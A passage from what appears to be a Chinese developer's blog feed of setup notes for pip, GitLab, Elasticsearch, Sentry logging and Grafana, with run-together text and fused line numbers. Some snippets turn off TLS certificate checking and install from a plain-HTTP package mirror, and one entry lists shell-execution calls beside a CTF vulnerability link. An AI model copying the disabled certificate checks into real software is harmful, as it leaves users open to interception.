status=None)) after connection broken by 'SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))': /simple/requests/WARNING: Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))': /simple/requests/WARNING: Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))': /simple/requests/WARNING: Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))': /simple/requests/Could not fetch URL https://pypi.org/simple/requests/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/requests/ (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))) - skippingRequirement already up-to-date: requests in d:\python\lib\site-packages (2.21.0)Requirement already satisfied, skipping upgrade: idna&lt;2.9,&gt;=2.5 in d:\python\lib\site-packages (from requests) (2.8) pip --trusted-host pypi.doubanio.com install -U tqdm -i http://pypi.doubanio.com/simpleLooking in indexes: http://pypi.doubanio.com/simpleCollecting tqdm Downloading http://pypi.doubanio.com/packages/4a/1c/6359be64e8301b84160f6f6f7936bbfaaa5e9a4eab6cbc681db07600b949/tqdm-4.45.0-py2.py3-none-any.whl (60kB) |████████████████████████████████| 61kB 1.9MB/sInstalling collected packages: tqdm Found existing installation: tqdm 4.28.1 Uninstalling tqdm-4.28.1: Successfully uninstalled tqdm-4.28.1Successfully installed tqdm-4.45.0创建或修改配置文件（linux的文件在~/.pip/pip.conf，windows在%HOMEPATH%\pip\pip.ini），修改内容为：code:[global]index-url = http://pypi.douban.com/simple Python Requests throwing SSLError1234567891011121314151617import urllib3urllib3.disable_warnings()pip install certifi&gt;&gt;&gt; import requests&gt;&gt;&gt; requests.certs.where()'D:\\python\\lib\\site-packages\\certifi\\cacert.pem'requests.get(url, verify=False)cafile = 'cacert.pem' # http://curl.haxx.se/ca/cacert.pemr = requests.get(url, verify=cafile)requests.get("https://api.github.com/events", verify=True, cert=['/path/to/my/ca.crt'])https://stackoverflow.com/questions/10667960/python-requests-throwing-sslerrorhttps://requests.readthedocs.io/en/latest/user/advanced/#ssl-cert-verification Python 数据分析实战 | 用数据带你回顾乔丹的职业生涯 Python 包的创建 Flask 和 ChatterBot 构建聊天机器人 小项目来学习 Flask Flask 项目结构分享 纯前端实现人脸识别自动佩戴圣诞帽 python flask 微信机器人 中国大学MOOC、学堂在线、网易云课堂、好大学在线、爱课程 MOOC 课程下载。 100个Numpy练习 Python 图文识别 学Python前请你先看看这个文章！ Python进阶书籍 新闻类网站通用抽取器 https://github.com/kingname/GeneralNewsExtractor 用Python把公众号文章打包成pdf文件 用 Python 爬取 2018 前端热点 30分钟带你入门数据分析工具 Pandas PyCharm2019激活 wkhtmlpdf命令行工具发送微信图片告警 Python解密进相亲交流群 OpenCV和FFmpeg将普通视频转成代码视频 python3文档 从零开始的 TensorFlow tensorflow.google.cn/ Redis 结合 flask 及 vue 实现 SSE 在线聊天 Python社区文章 python版-批量中文文件名转英文 模拟登录一些知名的网站，为了方便爬取需要登录的网站fuck login pandas Python 快速打包发布软件PyPi上 Python进阶 Python 进程管理工具 Supervisor 使用教程 Python 入门教程 - 课程大纲 网易云音乐歌曲评论爬虫 爬取豆瓣短评之《后来的我们》 python奇技淫巧 爆破的方式收集子域名https://5alt.me/tools/ python模拟登陆一些大型网站，还有一些简单的爬虫 python 爬虫入门初级篇 https://piaosanlang.gitbooks.io/spiders/content/01day/README1.html python 坦克大战源码 https://learnku.com/articles/34725 pycharm激活码 过期 python教程 Python 反编译调用有道翻译 PDF 和图片互转 pandas 学习笔记]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信小程序项目收集]]></title>
    <url>%2F2019%2F02%2F25%2F%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E9%A1%B9%E7%9B%AE%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[小程序登录流程 微信小程序版博客1234567891011121314151617181920212223242526272829软件架构 https://learnku.com/articles/24562#topnav开发工具：微信开发者工具语言：直接使用原生的项目地址：https://github.com/yanthink/mpblog小程序后端开发工具：PhpStorm语言：PHP框架：Laravel 5.6数据库：Mysql 8.0队列：Redis全文搜索：Elasticsearchwebsocket：Redis + websockets/ws项目地址：https://github.com/yanthink/blog-api后台管理开发工具：WebStorm语言：JavaScript框架：ant design pro 2.0.0-beta.1项目地址：https://github.com/yanthink/blog运维反向代理：Nginx 1.12.2SSL证书：Symantec 免费版服务器：阿里云轻量级服务器 CentOS 7.3 知识付费小程序123456https://github.com/SmallRuralDog/yundocsyarn global add @tarojs/cligit clone https://github.com/SmallRuralDog/yundocs.git yundocscd yundocsyarn installyarn run dev:weapp 配置小程序前后端12345git clone https://github.com/jc91715/xcx-sina-sae.git projectcd project &amp;&amp; npm installnpm run --watchhttps://learnku.com/articles/23948 小程序社区1234http://yike.io/前端：https://github.com/overtrue/yike.io后端：https://github.com/overtrue/api.yike.io视频：https://learnku.com/courses/laravel-package/yikeio/2505 整理小程序登录状态维护笔记 微信小程序开发问题集锦藏头诗微信小程序，表白，祝福，整蛊。还可以抖音去水印。小程序码，微信直接扫一扫打开，或者微信搜：快抖工具箱百度AI体验中心微信小程序小程序图片裁剪插件]]></content>
      <tags>
        <tag>微信</tag>
        <tag>小程序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gitlab 使用]]></title>
    <url>%2F2019%2F01%2F22%2Fgitlab-%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[安装ssh1yum install -y curl policycoreutils-pythonopenssh-server 安装postfix123456789101112131415yum install postfix将postfix服务设置成开机自启动。安装命令：sudo systemctl enable postfix 启动postfix。安装命令：sudo systemctl start postfix如出现了错误：job for postfix.service failed. See 'systemctl status postfix.service' and 'journalctl -xn' for deta。然后执行vi /etc/hosts，注释掉下面这一行#::1 localhost localhost.localdomain localhost6 localhost6.localdomain6systemctl start postfix 添加GitLab镜像12345wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-10.0.0-ce.0.el7.x86_64.rpmrpm -i gitlab-ce-10.0.0-ce.0.el7.x86_64.rpm#rpm -e gitlab-ce-10.0.0-ce.0.el7.x86_64 卸载出现错误：依赖检测失败。yum install policycoreutils-python 修改gitlab配置123vim /etc/gitlab/gitlab.rb修改external_url 'http://xxxx'（xxx：代表公网IP地址） 启动GitLab123456789101112131415161718gitlab-ctl reconfiguregitlab-ctl restartok: run: alertmanager: (pid 3845) 0sok: run: gitaly: (pid 3854) 0sok: run: gitlab-monitor: (pid 3866) 0sok: run: gitlab-workhorse: (pid 3873) 1sok: run: logrotate: (pid 3878) 0sok: run: nginx: (pid 3889) 0sok: run: node-exporter: (pid 3891) 0sok: run: postgres-exporter: (pid 3903) 0sok: run: postgresql: (pid 3976) 1sok: run: prometheus: (pid 4000) 0sok: run: redis: (pid 4008) 0sok: run: redis-exporter: (pid 4013) 0sok: run: sidekiq: (pid 4025) 0sok: run: unicorn: (pid 4033) 1s直接输入服务器ip和指定端口进行访问初始账户:root 密码:第一次登录修改密码 问题12345678910排查问题利器：gitlab-rake gitlab:check ( check查看整体状态值)gitlab-ctl status (查询gitlab状态) 如果缺少资源，可以使用以下命令关闭Unicorn和Sidekiq，暂时释放一些内存：sudo gitlab-ctl stop unicornsudo gitlab-ctl stop sidekiq8080端口冲突原因：由于unicorn默认使用的是8080端口。解决办法：打开/etc/gitlab/gitlab.rb,打开# unicorn['port'] = 8080 的注释，将8080修改为9090，保存后运行sudo gitlab-ctl reconfigure即可。 5分钟教你搭建一个GitLab仓库 用GitLab搭建自己的私有GitHub 搭建GitLab 搭建本地GitLab仓库 Git &amp; Gitlab 使用指南 git在线测试 Jenkins CentOS 安装 自建GitHub镜像，速度提升百分之一千https://i.codeku.me]]></content>
      <tags>
        <tag>gitlab</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpunit]]></title>
    <url>%2F2019%2F01%2F18%2Fphpunit%2F</url>
    <content type="text"><![CDATA[执行命令的函数12345678import platformplatform.popen('ipconfig').read()import subprocesssubprocess.Popen('ipconfig', shell=True, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read()import osos.system('ls') https://www.restran.net/2018/10/29/ctf-python-vulnerability-notes/ 教你一步一步写一个phpunit testcase 入门 Composer和PHPUnit入门 phpunit笔记 通过Composer安装PHPunit并配置Phpstrom 开始使用PHPUnit PHPUnit 加速技巧分享 phpunit 快速入门 PHPUnit从零开始]]></content>
      <tags>
        <tag>phpunit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elasticsearch]]></title>
    <url>%2F2019%2F01%2F16%2Felasticsearch%2F</url>
    <content type="text"><![CDATA[安装javaelasticsearch 需要 java8 以上；我们到 https://www.oracle.com/technetwork/java/javase/downloads/index.html 下载安装最新版的 java11 jdk，选中 Accept License Agreement 然后右键点击 jdk-11.0.2_linux-x6 4_bin.rpm 复制链接12345678910111213141516171819202122232425262728293031323334353637383940414243444546[root@VM_0_14_centos ~]# wget https://download.oracle.com/otn-pub/java/jdk/11.0.2+7/f51449fcd52f4d52b93a989c5c56ed3c/jdk-11.0.2_linux-x6 4_bin.rpm--2019-01-16 12:42:46-- https://download.oracle.com/otn-pub/java/jdk/11.0.2+7/f51449fcd52f4d52b93a989c5c56ed3c/jdk-11.0.2_linux-x64_bin.rpmResolving download.oracle.com (download.oracle.com)... 23.56.20.195Connecting to download.oracle.com (download.oracle.com)|23.56.20.195|:443... connected.HTTP request sent, awaiting response... 302 Moved TemporarilyLocation: https://edelivery.oracle.com/otn-pub/java/jdk/11.0.2+7/f51449fcd52f4d52b93a989c5c56ed3c/jdk-11.0.2_linux-x64_bin.rpm [following]--2019-01-16 12:42:47-- https://edelivery.oracle.com/otn-pub/java/jdk/11.0.2+7/f51449fcd52f4d52b93a989c5c56ed3c/jdk-11.0.2_linux-x64_bin.rpmResolving edelivery.oracle.com (edelivery.oracle.com)... 23.10.0.83, 2600:140e:6:39b::366, 2600:140e:6:38b::366Connecting to edelivery.oracle.com (edelivery.oracle.com)|23.10.0.83|:443... connected.HTTP request sent, awaiting response... 302 Moved TemporarilyLocation: http://download.oracle.com/errors/download-fail-1505220.html [following]--2019-01-16 12:42:48-- http://download.oracle.com/errors/download-fail-1505220.htmlConnecting to download.oracle.com (download.oracle.com)|23.56.20.195|:80... connected.HTTP request sent, awaiting response... 301 Moved PermanentlyLocation: https://download.oracle.com/errors/download-fail-1505220.html [following]--2019-01-16 12:42:48-- https://download.oracle.com/errors/download-fail-1505220.htmlConnecting to download.oracle.com (download.oracle.com)|23.56.20.195|:443... connected.HTTP request sent, awaiting response... 200 OKLength: 5307 (5.2K) [text/html]Saving to: ‘jdk-11.0.2_linux-x64_bin.rpm’100%[===============================================================================================&gt;] 5,307 --.-K/s in 0s2019-01-16 12:42:49 (319 MB/s) - ‘jdk-11.0.2_linux-x64_bin.rpm’ saved [5307/5307][root@VM_0_14_centos ~]# rpm -ivh jdk-11.0.2_linux-x6 4_bin.rpmerror: open of &lt;html&gt; failed: No such file or directoryerror: open of &lt;head&gt; failed: No such file or directory#rm -rf jdk-11.0.2_linux-x6 4_bin.rpm#wget --no-cookies --no-check-certificate --header "Cookie: gpw_e24=http:%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie" "https://download.oracle.com/otn-pub/java/jdk/11.0.2+7/f51449fcd52f4d52b93a989c5c56ed3c/jdk-11.0.2_linux-x6 4_bin.rpm"[root@VM_0_14_centos ~]# rpm -ivh jdk-11.0.2_linux-x64_bin.rpmwarning: jdk-11.0.2_linux-x64_bin.rpm: Header V3 RSA/SHA256 Signature, key ID ec551f03: NOKEYPreparing... ################################# [100%]Updating / installing... 1:jdk-11.0.2-2000:11.0.2-ga ########## ( 31%)################################# [100%][root@VM_0_14_centos ~]# java -hUsage: java [options] &lt;mainclass&gt; [args...] (to execute a class) or java [options] -jar &lt;jarfile&gt; [args...] (to execute a jar file) or java [options] -m &lt;module&gt;[/&lt;mainclass&gt;] [args...] java [options] --module &lt;module&gt;[/&lt;mainclass&gt;] [args...] (to execute the main class in a module) or java [options] &lt;sourcefile&gt; [args] (to execute a single source-file program) 安装es12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364[root@VM_0_14_centos ~]# rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch[root@VM_0_14_centos ~]# wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.4.2.rpm--2019-01-16 13:04:37-- https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.4.2.rpmConnecting to artifacts.elastic.co (artifacts.elastic.co)|107.21.239.197|:443... connected.HTTP request sent, awaiting response... 200 OKLength: 97875508 (93M) [application/octet-stream]Saving to: ‘elasticsearch-6.4.2.rpm’83% [==============================================================================&gt; ] 81,427,954 221KB/s in 15m 2s2019-01-16 13:19:45 (88.2 KB/s) - Connection closed at byte 81427954. Retrying.--2019-01-16 13:19:46-- (try: 2) https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.4.2.rpmConnecting to artifacts.elastic.co (artifacts.elastic.co)|107.21.239.197|:443... connected.HTTP request sent, awaiting response... 206 Partial ContentLength: 97875508 (93M), 16447554 (16M) remaining [application/octet-stream]Saving to: ‘elasticsearch-6.4.2.rpm’100%[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++================&gt;] 97,875,508 1.66MB/s in 14s2019-01-16 13:20:02 (1.16 MB/s) - ‘elasticsearch-6.4.2.rpm’ saved [97875508/97875508][root@VM_0_14_centos ~]# rpm -ivh elasticsearch-6.4.2.rpmPreparing... ################################# [100%]Creating elasticsearch user... OKUpdating / installing... 1:elasticsearch-0:6.4.2-1 ################################# [100%]### NOT starting on installation, please execute the following statements to configure elasticsearch service to start automatically using systemd sudo systemctl daemon-reload sudo systemctl enable elasticsearch.service### You can start elasticsearch service by executing sudo systemctl start elasticsearch.serviceCreated elasticsearch keystore in /etc/elasticsearchvim /etc/elasticsearch/elasticsearch.ymlbootstrap.memory_lock: truenetwork.host: localhosthttp.port: 9200[root@VM_0_14_centos ~]# systemctl daemon-reload[root@VM_0_14_centos ~]# systemctl enable elasticsearch.serviceCreated symlink from /etc/systemd/system/multi-user.target.wants/elasticsearch.service to /usr/lib/systemd/system/elasticsearch.service. [root@VM_0_14_centos ~]# systemctl start elasticsearch[root@VM_0_14_centos ~]# systemctl status elasticsearch● elasticsearch.service - Elasticsearch Loaded: loaded (/usr/lib/systemd/system/elasticsearch.service; enabled; vendor preset: disabled) Active: failed (Result: signal) since Wed 2019-01-16 20:35:07 CST; 20min ago Docs: http://www.elastic.co Process: 31064 ExecStart=/usr/share/elasticsearch/bin/elasticsearch -p $&#123;PID_DIR&#125;/elasticsearch.pid --quiet (code=killed, signal=KILL) Main PID: 31064 (code=killed, signal=KILL)Jan 16 20:34:13 VM_0_14_centos systemd[1]: Started Elasticsearch.Jan 16 20:34:13 VM_0_14_centos systemd[1]: Starting Elasticsearch...Jan 16 20:34:18 VM_0_14_centos elasticsearch[31064]: Java HotSpot(TM) 64-Bit Server VM warning: Option UseConcMarkSweepGC was de...lease.Jan 16 20:35:07 VM_0_14_centos systemd[1]: elasticsearch.service: main process exited, code=killed, status=9/KILLJan 16 20:35:07 VM_0_14_centos systemd[1]: Unit elasticsearch.service entered failed state.Jan 16 20:35:11 VM_0_14_centos systemd[1]: elasticsearch.service failed.Hint: Some lines were ellipsized, use -l to show in full.//https://learnku.com/laravel/t/25013安装的话可以参考腾讯实验室的功能；挺好用的； https://cloud.tencent.com/developer/labs/lab/10433#wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.6.1.tar.gztar -zxvf elasticsearch-6.6.1.tar.gzcd elasticsearch-6.6.1./bin/elasticsearchcurl 'http://localhost:9200/?pretty' Elasticsearch 中文分词器 ik-analyzer123/usr/share/elasticsearch/bin/elasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v6.4.2/elasticsearch-analysis-ik-6.4.2.zipsudo systemctl restart elasticsearchcurl -H 'Content-Type: application/json' -XGET 'localhost:9200/_analyze?pretty' -d '&#123;"analyzer":"ik_max_word","text":"ytkah博客园"&#125;' Laravel 项目中使用 Elasticsearch 做引擎 Elasticsearch 实现简单搜索 ELK集中式日志平台之二 — 部署 elk demo ElasticSearch的安装与使用必知问题 配置Elasticsearch 像使用 Laravel Query 一样的搜索 Elasticsearch elasticsearch-centos7安装教程 CentOS 7 安装 Elasticsearch 6.4.2 教程 Elasticsearch入门教程之安装与基本使用 Elasticsearch 入门教程 开源的项目有用到 Elasticsearch 5 分钟配置并使用 Elasticsearch Elasticsearch 的配置与使用，为了全文搜索 CentOS 7.x 安装 Elasticsearch 6.x Elasticsearch，为了搜索 Elasticsearch入门教程之安装与基本使用 在Laravel5.5中使用搜索 Elasticsearch ELK 搭建笔记 elasticsearch-centos7安装教程 Solr的使用 — 部署和数据推送 一文上手 Elasticsearch常用可视化管理工具 Laravel 下 Elasticsearch 使用 CentOS 7.6 安装 Elasticsearch 7.2 和我一起打造个简单搜索之ElasticSearch入门]]></content>
      <tags>
        <tag>elasticsearch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php sentry]]></title>
    <url>%2F2019%2F01%2F15%2Fphp-sentry%2F</url>
    <content type="text"><![CDATA[sentry 是一个 配置sentry可以在sentry.io注册账号获取配置https://sentry.io/settings/sina-tl/sina/keys/ ，如 http://root:root@127.0.0.1:1234/2当然也可以自己搭建服务器，参考 https://laravel-china.org/articles/4285/build-your-own-sentry-service sentry扩展123456789composer require "sentry/sentry"require_once APP_BASE_PATH.'/vendor/autoload.php';$client = new \Raven_Client('http://root:root@127.0.0.1:1234/2');$error_handler = new \Raven_ErrorHandler($client);$error_handler-&gt;registerExceptionHandler();$error_handler-&gt;registerErrorHandler();$error_handler-&gt;registerShutdownFunction(); //直接写日志 $client-&gt;captureMessage('my log message'); monolog日志写入Redis12345678910111213141516171819202122232425262728293031323334353637383940414243 composer require "monolog/monolog: 1.18.0" composer require 'predis/predis'use Monolog\Handler\RedisHandler;use Monolog\Formatter\JsonFormatter;use Monolog\Formatter\LineFormatter;use Monolog\Processor\MemoryPeakUsageProcessor;use Monolog\Processor\WebProcessor;use Monolog\Processor\IntrospectionProcessor;use Monolog\Handler\RavenHandler;use Monolog\Logger;class Monolog&#123; public $logger; public function __construct($name) &#123; $this-&gt;logger = new Logger($name); //https://docs.sentry.io/clients/php/integrations/monolog/ $redis = new \Predis\Client([ 'scheme' =&gt; 'tcp', 'host' =&gt; '127.0.0.1', 'port' =&gt; 6379, 'read_write_timeout' =&gt; 0, ]); $handler = new RedisHandler($redis, "app:sentry", \Monolog\Logger::DEBUG); $this-&gt;logger-&gt;pushHandler($handler); $handler-&gt;setFormatter(new JsonFormatter(JsonFormatter::BATCH_MODE_NEWLINES, true)); $handler-&gt;pushProcessor(new MemoryPeakUsageProcessor(true)); $handler-&gt;pushProcessor(new IntrospectionProcessor()); $arr = [ 'url' =&gt; 'REQUEST_URI', 'ip' =&gt; 'REMOTE_ADDR', 'http_method' =&gt; 'REQUEST_METHOD', 'query_string' =&gt; 'QUERY_STRING', 'cookies' =&gt; 'HTTP_COOKIE', 'host' =&gt; 'HTTP_HOST', 'referrer' =&gt; 'HTTP_REFERER', 'ua' =&gt; 'HTTP_USER_AGENT', ]; $handler-&gt;pushProcessor(new WebProcessor(null, $arr)); $this-&gt;logger-&gt;addinfo('applog',['info'=&gt;'test']); &#125; 消费redis入sentry123456789101112131415161718192021222324252627use Raven_Client;use Monolog\Handler\RavenHandler;use Monolog\Formatter\LineFormatter;while (true) &#123; $redis = new \Predis\Client([ 'scheme' =&gt; 'tcp', 'host' =&gt; '127.0.0.1', 'port' =&gt; 6379, 'read_write_timeout' =&gt; 0, ]); $data = $redis-&gt;lpop("app:sentry"); if (empty($data)) &#123; sleep(1); continue; &#125; $data = json_decode($data, true); $raven_client= new Raven_Client('http://root:root@127.0.0.1:1234/3',[ 'extra'=&gt;$data['extra'], 'tags'=&gt;[] ]); $raven_hanlder=new RavenHandler($raven_client); $data['extra'] = []; $r=$raven_hanlder-&gt;handle($data); $raven_client-&gt;__destruct(); 查看错误日志1https://sentry.io/sina-tl/sina/issues/845243592/?query=is%3Aunresolved php sentry Docker部署Sentry监控Django应用并使用email+钉钉通知 php sentry usage 搭建私有的前端监控服务: sentry sentry异常提醒 CentOS6 基于 Python 安装 Sentry]]></content>
      <tags>
        <tag>php</tag>
        <tag>sentry</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据分析平台grafana]]></title>
    <url>%2F2019%2F01%2F11%2F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0grafana%2F</url>
    <content type="text"><![CDATA[安装123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111//http://docs.grafana.org/installation/rpm/ https://blog.csdn.net/bbwangj/article/details/81109615[root@VM_0_14_centos blog]# service grafana-server startStarting grafana-server (via systemctl): systemctl start grafana-server [ OK ][root@VM_0_14_centos blog]# systemctl start grafana-server[root@VM_0_14_centos blog]# systemctl enable grafana-server.serviceCreated symlink from /etc/systemd/system/multi-user.target.wants/grafana-server.service to /usr/lib/systemd/system/grafana-server.service.[root@VM_0_14_centos blog]# grafana-cli plugins install alexanderzobnin-zabbix-appinstalling alexanderzobnin-zabbix-app @ 3.9.1from url: https://grafana.com/api/plugins/alexanderzobnin-zabbix-app/versions/3.9.1/downloadinto: /var/lib/grafana/plugins✔ Installed alexanderzobnin-zabbix-app successfullyRestart grafana after installing plugins . &lt;service grafana-server restart&gt;[root@VM_0_14_centos blog]# grafana-cli plugins install grafana-piechart-panelinstalling grafana-piechart-panel @ 1.3.4from url: https://grafana.com/api/plugins/grafana-piechart-panel/versions/1.3.4/downloadinto: /var/lib/grafana/plugins✔ Installed grafana-piechart-panel successfullyRestart grafana after installing plugins . &lt;service grafana-server restart&gt;[root@VM_0_14_centos blog]# grafana-cli plugins lsinstalled plugins:alexanderzobnin-zabbix-app @ 3.9.1grafana-piechart-panel @ 1.3.4Restart grafana after installing plugins . &lt;service grafana-server restart&gt;grafana-cli plugins update &lt;plugin-id&gt;grafana-cli plugins remove &lt;plugin-id&gt;grafana-cli plugins install grafana-simple-json-datasource /etc/init.d/grafana-server restart [root@VM_0_14_centos blog]# ll /usr/share/grafana/public/app/plugins/datasource/ total 60 drwxr-xr-x 5 root root 4096 Jan 10 14:16 cloudwatch drwxr-xr-x 5 root root 4096 Jan 10 14:16 elasticsearch drwxr-xr-x 4 root root 4096 Jan 10 14:16 grafana drwxr-xr-x 3 root root 4096 Jan 10 14:16 grafana-live drwxr-xr-x 6 root root 4096 Jan 10 14:16 graphite drwxr-xr-x 5 root root 4096 Jan 10 14:16 influxdb drwxr-xr-x 5 root root 4096 Jan 10 14:16 logging drwxr-xr-x 2 root root 4096 Jan 10 14:16 mixed drwxr-xr-x 5 root root 4096 Jan 10 14:16 mssql drwxr-xr-x 5 root root 4096 Jan 10 14:16 mysql drwxr-xr-x 5 root root 4096 Jan 10 14:16 opentsdb drwxr-xr-x 5 root root 4096 Jan 10 14:16 postgres drwxr-xr-x 8 root root 4096 Jan 10 14:16 prometheus drwxr-xr-x 6 root root 4096 Jan 10 14:16 stackdriver drwxr-xr-x 3 root root 4096 Jan 10 14:16 testdata[root@VM_0_14_centos blog]# systemctl restart grafana-server//https://blog.csdn.net/Hu_wen/article/details/78890159export GOPATH=`pwd`go get github.com/grafana/grafanacd $GOPATH/src/github.com/grafana/grafanago run build.go setupgo run build.go build yum install bzip2npm install -g yarnyarn install --pure-lockfilenpm run build./bin/grafana-servergrafana的模板资源主要是在源码的public下，修改相应的html文件以及js文件就可以汉化# 二进制程序文件/usr/sbin/grafana-server# init.d脚本/etc/init.d/grafana-server# 安装默认环境变量文件/etc/sysconfig/grafana-server# 配置文件/etc/grafana/grafana.ini# systemd服务名称grafana-server.service# 日志文件/var/log/grafana/grafana.log# 默认sqlite3数据库/var/lib/grafana/grafana.db[root@VM_0_14_centos blog]# vi /etc/grafana/grafana.inihttp_port=3003[root@VM_0_14_centos blog]# systemctl restart grafana-server[root@VM_0_14_centos blog]# systemctl status grafana-server● grafana-server.service - Grafana instance Loaded: loaded (/usr/lib/systemd/system/grafana-server.service; enabled; vendor preset: disabled) Active: active (running) since Thu 2019-01-10 14:59:27 CST; 6s ago Docs: http://docs.grafana.org Main PID: 28408 (grafana-server) Memory: 16.5M CGroup: /system.slice/grafana-server.service └─28408 /usr/sbin/grafana-server --config=/etc/grafana/grafana.ini --pidfile=/var/run/grafana/grafana-server.pid --packagin...Jan 10 14:59:27 VM_0_14_centos grafana-server[28408]: t=2019-01-10T14:59:27+0800 lvl=info msg="Initializing PluginManager" logger=server Jan 10 14:59:27 VM_0_14_centos grafana-server[28408]: t=2019-01-10T14:59:27+0800 lvl=info msg="Starting plugin search" logger=pluginsJan 10 14:59:27 VM_0_14_centos grafana-server[28408]: t=2019-01-10T14:59:27+0800 lvl=info msg="Registering plugin" logger=plugin...ZabbixJan 10 14:59:27 VM_0_14_centos grafana-server[28408]: t=2019-01-10T14:59:27+0800 lvl=info msg="Registering plugin" logger=plugin...ggers"Jan 10 14:59:27 VM_0_14_centos grafana-server[28408]: t=2019-01-10T14:59:27+0800 lvl=info msg="Registering plugin" logger=plugin...ZabbixJan 10 14:59:27 VM_0_14_centos grafana-server[28408]: t=2019-01-10T14:59:27+0800 lvl=info msg="Registering plugin" logger=plugin...Chart"Jan 10 14:59:27 VM_0_14_centos systemd[1]: Started Grafana instance.Jan 10 14:59:27 VM_0_14_centos grafana-server[28408]: t=2019-01-10T14:59:27+0800 lvl=info msg="Initializing TracingService" logger=serverJan 10 14:59:27 VM_0_14_centos grafana-server[28408]: t=2019-01-10T14:59:27+0800 lvl=info msg="Initializing Stream Manager"Jan 10 14:59:27 VM_0_14_centos grafana-server[28408]: t=2019-01-10T14:59:27+0800 lvl=info msg="HTTP Server Listen" logger=http.s...ocket=Hint: Some lines were ellipsized, use -l to show in full. 访问http://118.24.158.116:3003 默认账号密码 admin admin Grafana 文档（目录）]]></content>
      <tags>
        <tag>grafana</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git 笔记]]></title>
    <url>%2F2019%2F01%2F08%2Fgit-%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[linux123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354https://www.itcodemonkey.com/article/12558.html[alvin@VM_0_16_centos ~]$ whoamialvin查看当前登录到服务器的用户有哪一些。[alvin@VM_0_16_centos ~]$ whoalvin pts/0 2018-12-09 07:25 (116.199.***.***)root pts/1 2018-12-09 11:05 (116.199.***.***)alvin pts/2 2018-12-09 11:05 (116.199.***.***)harry pts/3 2018-12-09 11:06 (116.199.***.***)kate pts/4 2018-12-09 11:08 (116.199.***.***)alvin pts/5 2018-12-09 11:53 (116.199.***.***)在显示结果里，第一列是用户名；第二列是连接的终端，tty 表示显示器，pts 表示远程连接；第三列是登陆时间。这里信息稍微多一些，但如果我们只想知道谁在线要怎么操作？只需用 users 命令来查看即可。[alvin@VM_0_16_centos ~]$ usersalvin alvin alvin harry kate root显示已经登录系统的用户的名称，以及他们正在做的事[alvin@VM_0_16_centos ~]$ w 16:25:54 up 29 days, 6:05, 6 users, load average: 0.00, 0.01, 0.05USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATalvin pts/0 116.199.***.** 07:25 2.00s 0.11s 0.00s wroot pts/1 116.199.***.** 11:05 5:20m 0.02s 0.02s -bashalvin pts/2 116.199.***.** 11:05 5:20m 0.04s 0.05s sshd: alvin [priv]harry pts/3 116.199.***.** 11:06 4:33m 18.08s 18.06s watch datekate pts/4 116.199.***.** 11:08 4:33m 10.51s 10.48s topalvin pts/5 116.199.***.** 11:53 4:32m 0.02s 0.02s -bash[alvin@VM_0_16_centos ~]$ w alvin 16:34:21 up 29 days, 6:14, 6 users, load average: 0.00, 0.01, 0.05USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATalvin pts/0 116.199.***.** 07:25 5.00s 0.12s 0.06s sshd: alvin [priv]alvin pts/2 116.199.***.** 11:05 5:28m 0.04s 0.05s sshd: alvin [priv]alvin pts/5 116.199.***.** 11:53 4:40m 0.02s 0.02s -bashlast命令可用于显示特定用户登录系统的历史记录[alvin@VM_0_16_centos ~]$ last alvinalvin pts/5 116.199.***.** Sun Dec 9 11:53 still logged inalvin pts/2 116.199.***.** Sun Dec 9 11:05 still logged inalvin pts/0 116.199.***.** Sun Dec 9 07:25 still logged inalvin pts/0 116.199.***.** Sat Dec 8 20:42 - 23:10 (02:28)alvin pts/0 119.33.***.** Mon Dec 3 20:50 - 23:51 (1+03:01)alvin pts/0 119.33.***.** Thu Nov 29 20:20 - 22:45 (02:24)alvin pts/0 223.104.***.** Thu Nov 29 